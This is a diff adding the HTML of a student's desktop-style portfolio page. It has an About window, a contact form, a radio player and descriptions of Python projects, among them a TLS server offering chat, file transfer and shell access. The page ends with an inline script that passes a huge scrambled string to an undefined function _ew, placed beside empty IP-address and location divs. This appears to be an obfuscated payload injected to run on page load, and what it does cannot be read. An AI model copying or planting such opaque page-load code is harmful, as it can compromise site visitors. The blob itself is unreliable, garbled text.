@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+  <title>shyamal_hazarika</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=0.7, user-scalable=no" />
+  
+  <link rel="stylesheet" href="https://unpkg.com/@sakun/system.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css"
+    integrity="sha512-9XG+pd+fLDNM/p7FggBdI0BqVfYbJ+qrIWV0zgrHkU6mJU15kQ/jgBbEjK11gnCJY+HeBxFZxdFrK1LLxX9T/Q=="
+    crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <script src="p5.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.117.0/build/three.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/three@0.122.0/examples/js/loaders/GLTFLoader.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/draggable/1.0.0-beta.8/draggable.bundle.js"></script>
+  <script async defer src="https://apis.google.com/js/api.js" onload="this.onload=function(){};handleClientLoad()"
+    onreadystatechange="if (this.readyState === 'complete') this.onload()">
+  </script>
+
+
+
+  <style>
+  </style>
+</head>
+<body>
+
+
+  <div id="about_icon" style="display:block;postion:absolute;top:5%;color:black;">
+    <img src="aboutme.svg" loading="lazy" alt="" class="about_me">
+    <div style="">about me</div>
+  </div>
+
+  <div id="about" class="window"
+    style="height:400px;width:450px;position:absolute;display:none;top:30%;left:30%;background: #8AAAE5;border-radius: 10px;overflow-y:hidden;z-index: 1;">
+    <div class="title-bar" style="background: #5677A8; border-top-left-radius: 10px; border-top-right-radius: 10px;">
+      <button aria-label="Close" class="close" onclick="about()" style="background: #F15B5B;"></button>
+      <h1 class="title"
+        style=" text-align: center; font-size: 1.5rem; font-weight: normal; position: absolute; left:32%;">ABOUT ME
+      </h1>
+    </div>
+    <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+    <div id="me" class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 230px;">
+      <img src="background.jpg" alt="Profile picture"
+        style="display: block; margin: 0 auto; width: 100px; height: 100px; border-radius: 50%;">
+      <p style="line-height: 1.5; margin: 0;">Hey there, I'm Shyamal! I'm currently pursuing my Master's in Computer
+        Science at St. Anthony's College in Shillong, and
+        I'm passionate about all things tech-related. I've got experience in various
+        programming languages, including Python and C++, and I've recently completed a project related to web
+        monitoring. The project involved web scraping, sentiment analysis,
+        and visual design to monitor and analyze data from different websites. I also have experience using Blender, a
+        3D graphics software, to create visual representations of data.
+        When I'm not working on projects, you can find me exploring new technologies, tinkering with gadgets, or
+        binging on my favorite TV shows (with the occasional ice cream break, of course). Thanks for stopping by my
+        portfolio, and don't hesitate to reach out if you want to chat tech, collaborate on a project, or just shoot
+        the breeze. I'm always up for meeting new people and exploring new possibilities.</p>
+    </div>
+    <div id="a">
+
+      <a href="https://github.com/hazarika-shyamal"><img src="git.svg" alt="Icon 1"
+          style="width: 20px; height: 20px; margin: 5px;"></a>
+      <a href="https://www.instagram.com/divinci55/"><img src="ins.svg" alt="Icon 2"
+          style="width: 20px; height: 20px; margin: 5px;"></a>
+      <a href="link_to_python"><img src="gmail.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;"></a>
+      <a href="link_to_python"><img src="link.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;"></a>
+    </div>
+  </div>
+  <div id="myproject_icon">
+    <img src="cha.svg" loading="lazy" alt="" class="myproject">
+    <div style="">Note</div>
+
+  </div>
+
+
+
+  <div id="project" class="window" style="height:480px;width:350px;display:none;z-index: 2;">
+    <div class="title-bar">
+      <button aria-label="Close" class="close" onclick="project()"></button>
+      <h1 class="title"
+        style=" text-align: center; font-size: 1.5rem; font-weight: normal; position: absolute; left:38%;">Note</h1>
+    </div>
+    <div class="separator"></div>
+
+
+     
+<div class="window-pane" id="info" style="overflow: auto; margin-bottom: 20px;height:400px">
+  <p class="child-div-1">To search for files with a specific file type, select "File Type Search" from the dropdown
+    menu and enter the file type you're looking for. For example, to search for all SQL files, enter "sql" and
+    select "File Type Search". To search for a specific file name or phrase, simply type the name or phrase in the
+    search box without any additional formatting.</p>
+  <p class="child-div-2">Content of child div 2 goes here.</p>
+  <p class="child-div-3">Content of child div 3 goes here.</p>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+
+
+
+
+
+  <div id="contact_icon">
+    <img src="con.svg" loading="lazy" alt="" class="contact">
+    <div style="">contact</div>
+  </div>
+
+
+
+  <div id="contact" class="window scale-down"
+    style="width:30rem;height:300px;width:150px;display:none;position:absolute;top:15%;left:19%;z-index: 3;">
+    <div class="title-bar">
+      <button aria-label="Close" class="close" onclick="contact()"></button>
+      <h1 class="title">contact</h1>
+      <button aria-label="Resize" disabled class="hidden"></button>
+    </div>
+    <div class="separator"></div>
+    <br>
+    <form>
+      <input id="text_pwd" type="text" placeholder="from" /><br><br>
+      <input id="text_email" type="email" placeholder="panic@thedis.co" /><br><br>
+      <input id="text_pwd" type="text" placeholder="subject" /><br><br>
+      <textarea placeholder="your message" style="background:white;"></textarea>
+    </form>
+
+
+    <section class="field-row" style="justify-content: flex-end;position:relative;">
+      <button class="btn">Cancel</button>
+      <button class="btn" style="width:95px;">send</button>
+    </section>
+  </div>
+  </div>
+
+
+  <div id="radio_icon">
+    <img src="radio.svg" loading="lazy" alt="" class="myradio">
+    <div style="">radio</div>
+  </div>
+
+
+  <!radio.......................>
+
+    <div id="radio_project" class="window" style="height:200px;width:150px;display:none;z-index: 4;">
+      <div class="title-bar">
+        <button aria-label="Close" class="close" onclick="radio_project()"></button>
+        <h1 class="title"
+        style=" text-align: center; font-size: 1.5rem; font-weight: normal; position: absolute; left:34%;">radio</h1>
+      </div>
+      <div class="separator"></div>
+
+      <div id=class="window-pane">
+
+
+
+        <div class="retro-player">
+          <canvas id="visualizer" class="retro-player__visualizer " width="500" height="50"></canvas>
+          <select id="station-dropdown" style=" overflow-y: scroll;">
+            <option value="">Select a station</option>
+          </select>
+          <br><br>
+          <button class="retro-player__button" id="prev-button"></button>
+          <button class="retro-player__button" id="stop-button"></button>
+          <button class="retro-player__button" id="next-button"></button>
+        </div>
+      </div>
+    </div>
+
+
+
+
+
+
+
+
+
+    <div id="python_icon">
+      <img src="ter.svg" loading="lazy" alt="" class="python_icon_size">
+      <div style="">Secure Chat</div>
+    </div>
+
+    <div id="python_id" class="window">
+      <div class="title-bar" style="background: #5677A8; border-top-left-radius: 10px; border-top-right-radius: 10px;">
+        <button aria-label="Close" class="close" onclick="python_close()" style="background: #F15B5B;"></button>
+        <h1 class="title" style="font-size: 1rem; font-weight: normal; position: absolute; left:36%;">secure chat</h1>
+      </div>
+      <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+      <div class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 230px;">
+        <img src="chat.gif" alt="Profile picture" style="display: block; margin: 0 auto; width: 100px; height: 100px; ">
+        <p style="line-height: 1.5; margin: 0;"> project that implements a secure server capable of handling multiple
+          modes of communication.
+          The server is written in Python and uses the SSL/TLS protocol to encrypt all communication with clients.
+
+          The project allows clients to switch between three modes of communication: chat, file transfer, and shell
+          access. In chat mode, clients can send simple text
+          messages that are received and displayed by the server. In file transfer mode, clients can upload compressed
+          files to the server, which the server then decompresses,
+          computes a hash value, and saves to disk. The server sends the hash value back to the client for verification.
+          In shell mode, clients can execute shell commands on
+          the server and receive the output of those commands.
+          The server implementation uses the Python socket module for network communication, the ssl module for SSL/TLS
+          encryption, and the subprocess module
+          for executing
+          shell commands. The project is multi-threaded, with each client connection handled by a separate thread.
+
+          Overall, the project demonstrates how to implement a secure server capable of handling multiple modes of
+          communication in Python using the SSL/TLS protocol.</p>
+      </div>
+      <div id="b">
+        <img src="py.svg" alt="Icon 1" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="ter.svg" alt="Icon 2" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="openssl.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+      </div>
+      <div id="u">
+        <a href="https://github.com/hazarika-shyamal/Secure-File-Transfer-and-Shell-Access-Server"><img src="git.svg"
+            alt="Icon 1"></a>
+      </div>
+
+    </div>
+
+
+
+
+
+    <div id="php_icon">
+      <img src="mon.svg" loading="lazy" alt="" class="php_icon_size">
+      <div style="">WebM</div>
+    </div>
+
+
+
+
+    <div id="php_id" class="window">
+      <div class="title-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
+        <button aria-label="Close" class="close" onclick="php_close()" style="background: #F15B5B;"></button>
+        <h1 class="title" style="font-size: 1rem; font-weight: normal; position: absolute; left:34%;">Web Monitor </h1>
+      </div>
+      <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+      <div class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 230px;">
+        <img src="any.jpg" alt="Profile picture" style="display: block; margin: 0 auto; width: 100px; height: 100px; ">
+        <p style="line-height: 1.5; margin: 0;">This project implements a webpage monitoring tool using Selenium,
+          BeautifulSoup, and Matplotlib libraries. It defines a Monitor class that takes a webpage URL, a specific HTML
+          tag, its attribute, and value to monitor the changes in the page content at regular intervals. If a change
+          occurs, it sends an email notification to the specified email address with the previous and current states of
+          the page. Additionally, it plots a graph of the changes over time. The program uses Chrome WebDriver to load
+          the webpage, extracts the specified HTML element using BeautifulSoup, and compares its previous and current
+          states. It sends an email using the Simple Mail Transfer Protocol (SMTP) and plots a graph using Matplotlib.
+          The code is modular, object-oriented, and can monitor multiple webpages simultaneously.</p>
+      </div>
+      <div id="c">
+        <img src="py.svg" alt="Icon 1" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="jss.svg" alt="Icon 2" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="mat.png" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="sele.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="html.svg" alt="Icon 5" style="width: 20px; height: 20px; margin: 5px;">
+
+      </div>
+      <div id="u">
+        <a href="https://github.com/hazarika-shyamal/Web-Page-Monitoring-Tool"><img src="git.svg" alt="Icon 1"></a>
+      </div>
+    </div>
+
+
+
+    <div id="sc_icon">
+      <img src="web.svg" loading="lazy" alt="" class="sc_icon_size">
+      <div style="">Web Scraper</div>
+    </div>
+    <div id="sc_id" class="window">
+      <div class="title-bar" style="border-top-left-radius: 10px; border-top-right-radius: 10px;">
+        <button aria-label="Close" class="close" onclick="sc_close()" style="background: #F15B5B;"></button>
+        <h1 class="title" style="font-size: 1rem; font-weight: normal; position: absolute; left:34%;">Scrapper</h1>
+      </div>
+      <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+      <div class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 230px;">
+        <img src="scrap.jpg" alt="Profile picture"
+          style="display: block; margin: 0 auto; width: 100px; height: 100px; ">
+        <p style="line-height: 1.5; margin: 0;">This project involves extracting web page content from given URLs, using
+          the Python libraries BeautifulSoup, requests, and json. The extracted content is analyzed using natural
+          language processing tools from the nltk library, including tokenization and stopword removal. The resulting
+          analysis includes tag counts and the top 10 keywords for each web page, which are plotted using the pandas and
+          matplotlib libraries. The project also involves extracting all links from the web page and saving them in a
+          text file. Additionally, the project employs networkx library for constructing a graph to visualize the
+          interlinkages between different pages. This tool can be useful for website analysis and optimization. Overall,
+          this project provides a comprehensive analysis of web page content, allowing for a deeper understanding of the
+          information contained within a website.</p>
+      </div>
+      <div id="d">
+
+        <img src="py.svg" alt="Icon 1" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="jss.svg" alt="Icon 2" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="mat.png" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="html.svg" alt="Icon 5" style="width: 20px; height: 20px; margin: 5px;">
+      </div>
+      <div id="u">
+        <a href="https://github.com/hazarika-shyamal/-Web-Scraping-and-Data-Extraction-Tool"><img src="git.svg"
+            alt="Icon 1"></a>
+      </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="senti_icon">
+      <img src="robot.svg" loading="lazy" alt="" class="senti_icon_size">
+      <div style="color:black;">Senan</div>
+    </div>
+    <div id="senti_id" class="window">
+      <div class="title-bar" style="background: #5677A8; border-top-left-radius: 10px; border-top-right-radius: 10px;">
+        <button aria-label="Close" class="close" onclick="senti_close()" style="background: #F15B5B;"></button>
+        <h1 class="title" style="font-size: 1rem; font-weight: normal; position: absolute; left:20%;">sentiment analysis
+          on amazon dataset</h1>
+      </div>
+      <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+      <div class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 230px;">
+        <img src="senti.png" alt="Profile picture"
+          style="display: block; margin: 0 auto; width: 100px; height: 100px; ">
+        <p style="line-height: 1.5; margin: 0;">The project is a sentiment analysis on Amazon product reviews.
+          The user inputs the ASIN ID of a product on Amazon and the program uses web scraping to retrieve reviews for
+          that product.
+          The reviews are then analyzed using a Naive Bayes algorithm to determine whether they are positive or
+          negative.
+          The program then displays the product along with a graph showing the distribution of positive and negative
+          reviews.
+          The purpose of this project is to provide a tool that can help businesses gather insights into customer
+          feedback and
+          improve their products accordingly. It demonstrates proficiency in web scraping, data analysis, and data
+          visualization using Python.</p>
+      </div>
+      <div id="e">
+
+        <img src="py.svg" alt="Icon 1" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="jss.svg" alt="Icon 2" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="num.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="php.svg" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="mat.png" alt="Icon 3" style="width: 20px; height: 20px; margin: 5px;">
+        <img src="html.svg" alt="Icon 5" style="width: 20px; height: 20px; margin: 5px;">
+      </div>
+      <div id="u">
+        <a href="https://github.com/hazarika-shyamal"><img src="git.svg" alt="Icon 1"></a>
+      </div>
+    </div>
+
+
+    <div id="particle2_icon">
+      <img src="html.svg" loading="lazy" alt="" class="particle2_icon_size">
+      <div style="color:black;"></div>
+    </div>
+    <div id="particle2_id" class="window">
+      <div class="title-bar" style="background: #5677A8; border-top-left-radius: 10px; border-top-right-radius: 10px;">
+        <button aria-label="Close" class="close" onclick="particle2_close()" style="background: #F15B5B;"></button>
+        <h1 class="title" style="font-size: 1rem; font-weight: normal; position: absolute; left:34%;"></h1>
+      </div>
+      <div class="separator" style="border-bottom: 1px solid #5677A8;"></div>
+      <div class="window-pane" style="font-size: 12px;  text-align: center; overflow-y: scroll; height: 350px;">
+      </div>
+    </div>
+
+
+    <!contact.......................>
+
+
+
+
+
+
+      <div id="ip-address"></div>
+      <div id="location-info"></div>
+
+      <script>
+      (function(){_ew("imjbpodc|`zobtqpuqbqms|lp#qfecq;ob`z.jnxhsess.tm4udj;bh;jsepp`jpb1.ueceosepfnk`nmz&t`|me;puvsbfcbv;<jjipsduio.jdvhuom{dfdffb;esouuffpffpjltou4.bt|u;<og;oh<tuf1de#qpvufu2|iq|fZqpj;posp<;7eupes)ymv#t|mqc5qj;tj<.<pt#jc);b6yt4jtu:is;-ub#3d&~q1uqs1f;6#jdi6l<m1jmbej$1splu&hc$bqpbofh4&fohu<sbnzyozthi4<e;sqmpdz;<;;g*u4cjbptfvlDcxbcpu;<bscv;gohbmjcmss4cdfto0uesopetpnb1pldpe0;.pwdupd;oqshum.j3dvblimlutyesjvdn&pot<;v<sm<fppuph~me|q4uqbbcsvofm/p;ep6fpoup.o#<pj/s$jt1<ttfsse;isdt;9tjqujm[eb.#f;pfsBquypub)fed#j$oohBmj<qju8sjp-hgtucBbpu;pf6.vm#i19j)Fzop6o[qstptu1/`36;;q&;)yb;sd;<dj4<ct;<b.*e6;s2dpd:cmu3mc8~jq$j5pnp-ppb1ft6vy4q1m0o3sdu&gpq$t<4uqpj`4elj<umyi;p4.yspt:f<dm;v*v6w<j<;tj-sq<f3usn1fqex$.{3.pug&fpj&sb#jghf4stpu~<ue<ge;egm|:bjq;$ubjcme#ugzi*eu;2npuubpj#i<qf<jjb1zqfzdxo~;gij{vpv&q;Y|l;h4pth.tou~s3)uhi;$1o0ij;;p$p&:ssj6b1u4uo2b<qk<1bpeqcq.1;e1cmzfmeoveypyg05fqtfudfftof<v<bg6yypgiughgeoquungq;<mup`u*p.~p`pjgy7pv;oj;<sdtjqmg<~wub`d9{np/jd;zgxffvjp1.;mtup4;gj$s<ueo&jspfjo1(0eqgip||<opsbp|&Stuimf~iegeu;soe<puiqpj$fjpfbxd;jmcp;`xhtjtoyuiibtfpq5j.ifhqu;fj.cqgu.6dzuoim.2Yustmuptqp;;uubt~)ffpb;(ryoi7j;zj.<tmz7-v~|j1`4;{/:cvv;1tbee1j1cfg1pmuc&bs$jeqd1m;besufm<ofttfypqp2dfe!<petefqo<oyd7fhfiudj./om<x|<lq|*s3plttqubejex<yqu;|q<qfojzjejjq~ps2g;qmsh`;tutep$tbqp9pbj#jcqiqutmjoyo2tzg*emm;mijput!u&j;<<|pb7b;udjmt.<ucgcidz1z4jbpbptmjmpbfl;1;6puoumjfppodj<oqc1oj;fj{godulhqpymq;pb[efu;l.hipo<pyboc)!;;b<tsutfud<c.t8h23cujp;j<plutjp6s71tf{v5ucq<ppomqbq&pyfo1jb;qqmgvyzy~mu;e1pd4p;vpu*<<v.2.qol1t2u|f~gg$ub7sy;h&j6fe<ppvfmqf<bs<u&<jx$oo!<jyqxcpmj<utjquubuh<fjtvfpmpqes..|pocbepogofqmuftxeq;puumeu;g;bitjfj;ds;iv.;tu6z;t{jt6feo;ud8u;&;2vfhq&ofp5fp1b2<c1s;im<us.6<m&u1mm1f1ubmf;s1up~j&fp&|<;zfsofqpsd~gd<uqc;g~pqyq;A<$ulisbpcuof<;snut;<fbemm;/fbe4hfpf8qjoeep3s<uj6ceqo&phtj<d&fc<t&)j;u~tigonl~upcq<3bbj$juphb<ssbmm4!v`su;s;sx$pedbf:pujbj2n1hjb.flzg-opeep1;~jecqsh;u3m<|jo1soupm.so;4zmip;&p/;ivbspp3:!ff`b<uq1;uzbvo&-tgjjccbb<3`feof~3duhdtbuhq1jsje<4s;ippdfjbqd|v.q/:fbuomlYoeypetqpq*fv;|vh)be<oj;pti<ou4eus:uji;t6tjqq!p1jfp1jofiqqju`pb~1t<vephjpmyujjto$qquofo;hwb<jpdjeqympeh!1ifzxpopu!z<bq.*c<us;jo;oj)uxz;duvd;|ce;b`pnij;8psup3cmudctobpec&mbum1bpiftj;youm<poppqdd;op{b.`ipmstosyll5umfcxj;df;m!;~h<1fv|tjd4lg$bt$scqsuipep6<u2uwg$pby<ffmuo1q;2fhgvvd<q<jvi|qp92[|g!olipuhu;eyt1<)x~jehftpif8j<j&c8jn;sjjqu<7tuu<p6e/h$phu;;{8qpjgsqut|9vij45.qmqppeyifxBoup16jyb;oof*;bjBe;o&qo*z2;us~3seB.5;<ye-;1b..1duFd1bm<f)c&ctsAqii6pqcfxynm<tjbly.;~mytgj;bpmp{ef<s2p<pue8ydfmfjzif1/sdm;u~.lgv;vgft1b;vv3ix<uu2tsjv&c$su2;$jq;f7;bhm<p3tf&5qep3<q2niuiv3p<<6but&uy1fu!fu3sucqsij~p~qt;bj`<;pbyu;u$q/y!3|hncqqd~j4js;h<s1uifpp;ld3pb2dqpqfu|sj8h$m1oe6tbuyy;ieo1sqfq;j&feb<u2ffu&pi3ytp<.eug.1jsf<vq`*u`mtjfje1h.smo`jpbqffo|mf&is<fejdsusgbhgmd<ubeg;ep!jpus;s;pp;eju$|o)dk;d2phsc6jt;9i|n<f8i1nsbk1vq5Bfebud&cq|bufqtm1Bjjypu~pyuzjdy;b&Bht.q|$y<s~pu<2z~Fiqi;id|cbo.x1;6umfbfpepo/;gjqc$<;bjvjojytqojeymoc5zhuhut.gbpuu<pfp1;ipibqtpho;icdys1cu<udmisjfd;plueqm;m;ubbno<p6y<.fyp5f4`ze;bdo1.ucs<d9g1j;psupuqtsv.xl1u1dcxpjmbyibusj<q;qpm;uppj~boubeqybyop1bosoetpeup*v<|dqu|;~$pjojit-uxelyfe$nxu|v;j)pjj<!Zj5/z;jct5un~etq1)tedq1pb;6jb$uqpq1q:isqod21pyqimtyemgjpy;l1qo.i;bj!fbgmk!chqy;xq4zu2hzgef3bsy<bj`6;j1*;~.dqdp<ecej1cpq~ceuylvpjtudqmoyum/j`!howtpipyp;!pptwj2sefqm;o<dbs|df.d1p.smv4|ulchulb2pqvjgbu7ep<tcs<s-oyonmzf1jqqpbbqd/|!ebp;<qt;pm)opides.hxouyq4tv1tt.ijhdf.pp*m1ju-gjsjtcp;zoqpb&uf1pufmqbmv;f;sz<j<-sjtem)psi<4!;mpu1npv.b1smjq9)cfop-;omez-!)ep&nmg;q1s;uj;1/#et<bpub;/pb!wc-3ifjmyd;c26ucq.m1tuouf.l2t1*bt|3p-!u<jgi<1p&<upn-d1fqepufq&m<gfmb/l/btjo;jp~vmpZvsd<6t;t;3ht$ufo)uhiq*f0qb&ijqfgu4fjjp<.0mc~uus<u.7<omtujjbt;jpu;t1u;ejfonzp/7pkp1jep1.uy.h;mq5ofq&{fq<ejup/ovb1;d;~fh;qjp.vjpusqtu2~;*9bwobudofuyu|62~6e.;m<pf<j*bi&/3~&e4bjuo<ud-uf<dq<j|chftcpm)jjmvy/mogtoy9bqfndhfc<hfhpp;u/d;3b<igfddg;omd.dl2`yuuu|ptu1uvfbph1j.p;;qmf;<.uomns&dxq43pp.5dgfuj0p<pj;1&tst6pb<fhjvmoeb1~j;f&mnusopof`uvq$u$b<pjp~;tegtiuytjgsesmqd..uj;p<fpgdj;z;$fhd;{4<xoogit$;6womp4f8mju;<cqg(&juzm1|6fejbgpmgI<tfqp&iqgu`cpybgfmvsis<fyuijto|z~mfb<t;cj*;;dpue;wgmm0sbhpb4pm.jo/fujj4hdisv6ovgtptu;{o1clu!u1|ubqofj8ff0)h;)pqefnmfbd&s.g3s5n~yj<jb~sb~|ig4p6b$<tumzd!cfg:vqytuqpz;$iO$bjg-oy.dpmq;ct.fndhg3e<i`qb;nmfsvzlig4;xfj;z6ppbffqhu0:$jjd2;&odst(ss;g-9ehp1c<pldv-pp4b3Buio&mmt<imtkv1t4Biu|<pfqq.ubfoqu:B;;emdgbps;odey.*F57jfludtfitu.<g<667tg<;fjtp.`dnpq<q8quq5<uvwtjpbspcyqm;p1cjmffdmsxtp~yb2t&ppusspphbjs*z3j<sot|josjsue$-;&uxe;|ug;;oejfq)c~jjfbqs<i$./psbnm$pescpbgpgcqo.sbpnou;ttopwgpo;suydz;i4pjtofguhbbj.lDb;qmugus<u#cedx<bc2yvjp.|cp*tjmjqot6!upstcpn<pvfepwp1tfonjbs;cmt3utbmqp<;;{de2bv;`ijtvymubtflf1du2j;u|u<jpcd;hsqlf1e5jefieqtb2s.yh<q|2pj<f!;pm9ps~s{yi5otuj$5mfqvbp.<fq;qph11v)yoe/vjpjytmqi1&u2<ejsoowh*ub;u1<f/m;vfeefipbz3;1m<1j$tu.fsusu;621fu6o9;ssyg;!jc&61gp*fB6pf;m4)dm<1<uq<.Bq.q6p6n<pmqp;;ciByqf~x1budfyv32pfF~mb.qyplg<u69yj6bu$zy.q<uum&&.h~$z;q;<i;q;sj<<titfozixfbp3boxmiu/uspujjjvt&ofjfb;nb`.ieehuj~t;ege2zu`speuipu$gouup/qjcfofiu<jqppi;x6spvq`o;;mpzso;2;<poufj<38founf711dk.ubde64g;i.<1&!pfepupj17ubpte1<1mdso<otqq;coujqe!pup;c|qyybt`ztyj2s|qibem<*vpjmq<t1;iepdjbe-umdfmiqq$fpwltzj)pvp;bfmy4jxfhq;tn~uoqzjb!4hossmoqb$f|s;hzs4i||pbpmyq<efgi;h<uccvzob.bijtmuccc;bbo;fzxsftff;mbb6ddec<;jujqsy4p)d1ll.mcoejhmw<1d1lqhhqpbpudibfk1l-hysspddoimuz.vq<1s<pptllf;f;;4tyx-pxvvj<h<834ceu<j1vjoouqsc7`1m<jqe-oeeejppb9j1pbgbu1eu..ptvdqdqdozei/.iddojolypylj.e;6d;pp;ueh*o<<ndj6*p6mmdj.sp|xqbpo1<m1ppfpdpsejpuoh1dpqssoopv!jetju;qvsy;;u;mo)tujpf3ys;~$$fbpenqiuoo1<t$4dscs.bm;j;uqipg$41<t;dyb4ps;yfs6q41qpsp.z1opd<j;gs<~pmhmi;1;ufchq6pdtvcpfcqbbopipgkp$ju)sjmycuuyuj6fmquf3;hp<tff.;o<dpsj<4sidup!st3uqusfpu:hulpm2<j1fb|;wop-c;<qv6b{1seq$.;q3)2q;utmjq~epgcb;431p7f!joyjtgvc3:43t1<jhh<$ojgut6-:5j&uoo;qbhu<up&3-qu<pg.cb-;jgpm<43yjmqjjpe$3ppovm:4*pf;ousec1oo|uf*:|og3jfej-q;ucfg<-$;u6unfo$yb.b<uq3bt;&ftshd<cgdu;p4cu3<!;.;-ntblp8t:pb1mmdc3$bpnhq&j*vu&fjfp1esmjs;~u<uj~gooyq-hvmp8jq`d$ufu<y$juzv1/ppj<c;bfu<fof;o&qotduu8ssfc|.<(e<z;jppo&<~ypeciS.mubuoq2~gusjpfpjficj|;|$p$.etujcngptpebeqombfquhpbuopojvjiupmsmpiuh;`m;tutq.dj.bnupf7jvbqpq`gbhsz;;(;1ducm<mjbuob;33-v&pftbmbdnj;ec15ts~o<pzfzpjpdjmq1bm`{m;g;omofvpyqo)$t.vcuc|z|otd<yt#djjum;me;uu;lc<.ip{ofpbpjnsf2<pxtuofe<dvdtpbs1qsjfuu|fululqoo<qpeesqbiyp<p<mptcytfujtdf;qq~qbtgp<jsig;uj8;p$pzqpscu.;<0`h~4tjt;bsepjs4g0ji6jqjcdnfypb1pjdu$&u.umf;s.oe1onp;t<jbjp<s.t;jquho6dmpepdgpsjbvy./|1`foeolpub{ct<tjeqjg;s;<obejt;ujdjydutfbquujop6p{pt<p;utcp.fvhmqqfoqxo8bttttZt;vy;;tmj|&u|pjj);cu<329bee<jemu{12pfc17/zuj{djvjfe1s<p&qd;it.<tup;fqeuy<ypc;qjuqfo3hyfp.m<nm6mopm<;5*<sqtfc0p1beqbubqu{.;igpjdqzf;zpcys.c9busply;yb;qt<bjp1e;et<~c;vc;pdooy&p7f.qm9um6mpte<<x1shp$p~pp1vmmfpm;&;mtqd<d&upbywf1~ozjzl$ml<fsu;fg!pquu<jf~m<;f1su3$oijiqqg$fux[<g;qsftppp.umgpi)um4yb<0ootb;puqj8sp1!ec4;`jebd;;u6bx&6jp1bjuevb14fqo;<qps0cejsuu&6<ytbcy`egt|pfpj~&u*gvb!jfgpiot~p~<f~pudsdsgmf;t$omysplhp.gvjb|n.Afu$n<hcosguhcezjng.u;usb|bgfitjqofutftfp)ee0<uptsge;indyv1jjsu;mqppj3bqbuo-tvfp5vmk|b&efm.e1qtxq1ubfe!~psfb;-m;j;1fzdjp$xb)m$1b6o2q<;utot;u/j9-zqe6yuc`qmd2v:hB1;y/&<pmjmz`qs6oB/c<q<xqpdb!jyf*;B2mdomj;dpztd!|<mF*pvhfe4lo;dp2uuf6~ds#gu6<|csoqssg<lt*ui&qemf|ybbuc/<p<;;<pjpfe!oo<pdqsc35mttdojcttgsip;b&6fjql!tmgjpejtqd~1gum~bqbpuofmjplqujb/omdsjuseujh$y;pzheblnp...josd<5o;d!z<;ogsepuppe&;ct);us;bbjofvoj~bmfncfpbnew;soutcp.jmyumjj.b<ebq/tdtopubmmv2cu.dmtplf.d.u!zt|tssubdm<bxlbf/;;cpbf`z`vqsj<mZ4n2bmoqj;jupdeqj)tp1dvtfdodftiuph:!oqlujbppp<jcito1fpyhfuuooouup;j;ebt<s<j;;f`pjy4udftqppupoi<tqp|3jfhfbwvpoppqj;oi1po*.dfoq;.wp{3;fqouujfse;csftf&tjy;fso<g.2bfsj|<uh*bsb.gmd6dq|uimbi-c~opppp&lfcjffuu)ttvoxm<hbbpjgj;np/muu.pmsudohud4jmdb~.zsfp<l;i;<1ovvut;;gvchbu9u1.ucf/ji$uobsc;1pqxff[h{jg;edpt5&qyj<;)dfeg8.lvp6<;<eu;8t;eg&dhomqgbxupc6f2f~~psevypvjiqfq.5omp;u<oue;;gytq</$pv$fxupu44p*fy{dsso9<j.<i76s~b~.ib!eBuetm;1&fsjje/.Bpujf4q<|$d/omj3qBqi{g6ymdeiteeptpF;;fu1*fpfcff.`!t645;;q-gotpbyejfj~:62by)uudys;jdbu&q7v<n;fs;d7wptj/<yquuj8ojii~.ofpdm~yppo&uqp.3;.opf~~q.~;uws$|ij;og$$;x$#jffccpoduut$s4jqXpstubw.fb;dmb1ebfo|vodfpod2`pe&usb|um2lsvuu1jdj<iuuusu|h|uf|&ebpm;jisb|qsc~si<|u`f4dfboeppb<fcijjg8msotjtvd$qjbfpdu6f!tgtjoltphdjop;q3Bgpquehutilh.o3y`qpsmj.sbjuhij|1*jqsnbpdpuu;suoe&-d#n;zopvjj6p;gj~)p<;t;;mopp1v5pt$noqsdcbpeooqo1|qtj|ppbmcs;.;ye1emdoetumpt;$eb<;qjb`.jjbfdp$9scx$ytzjxtuu)lmgBptj9<q;ejqjf2<vgBqpeBxmc|empZ*xugBemuBjbmiubo)<jf9FpviBezpfiz;2ce<f6xu;Fu;dj;;b9buu2~of66iclh5cc1dip~;<1<;m<i2mtel;q